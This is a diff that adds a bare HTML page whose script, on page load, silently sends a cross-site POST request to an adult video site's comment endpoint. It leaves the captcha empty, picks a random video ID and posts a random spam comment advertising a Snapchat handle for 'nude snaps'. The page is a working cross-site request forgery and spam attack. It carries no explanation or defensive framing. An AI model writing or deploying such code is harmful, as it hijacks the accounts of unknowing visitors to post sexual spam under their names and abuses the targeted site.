@@ -1,0 +1,47 @@
+<html><head><script>
+function getVid(){
+   var sites = ["2107925","2091071","1985675","1968143","2092219","2057197","1985677","1985676","2113658","2000612","2075653","2113622","2058035","2113659","2072003","2085566","1970286","1969853","1966367","2113667","1967111","1969663","1969478","1969100","1969086","1968935","1966407","1966342","1968176","1967667","1967588","1966874","1967011","1966972","2113660","1966462","2113611","1966090","2113650","2113606","1965628","1965246","1965194","1965577","2113628","2113656","2114295","1964340","2113626","1964024","1956947","1963744","1964741","1963441","1964423","1964389"];
+        var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
+function getCom(){
+     var sites1 = ["Lookin for guys to snap with katiegreen1992", "Guys to snap with? katiegreen1992", "just made snapchat and need new friends, katiegreen1992", "guys to nude snap with me? katiegreen1992", "guys snap me katiegreen1992", "lookin for men to snap with, katiegreen1992"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
+};
+var randy=Math.floor(Math.random()*1100);
+var cmt=getCom();
+var vid=getVid();
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+   xmlhttp['open']('POST', 'http://www.drtuber.com/ajax/add_comment', false);
+   xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+   xmlhttp['send']('type=video&target_id='+vid+'&comment='+cmt+'&capcha=');
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
+</script>
+</head>
+</html>
